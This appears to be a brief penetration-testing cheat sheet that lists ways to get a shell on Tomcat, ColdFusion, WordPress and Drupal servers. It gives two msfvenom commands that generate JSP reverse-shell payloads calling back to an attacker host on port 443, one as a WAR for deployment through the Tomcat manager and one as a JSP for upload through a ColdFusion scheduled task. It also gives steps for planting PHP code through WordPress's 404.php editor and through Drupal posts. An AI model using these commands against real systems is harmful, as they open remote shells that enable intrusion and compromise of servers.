
## Common framework
### Tomcat
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 -f war > shell.war
```
Deploy .war through /manager/html
https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
### Coldfusion
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 -f raw > shell.jsp
```
Upload through schedule task
### Wordpress
Edit 404.php in `Appearance`
### Drupal
Enable php in options
New post with php code
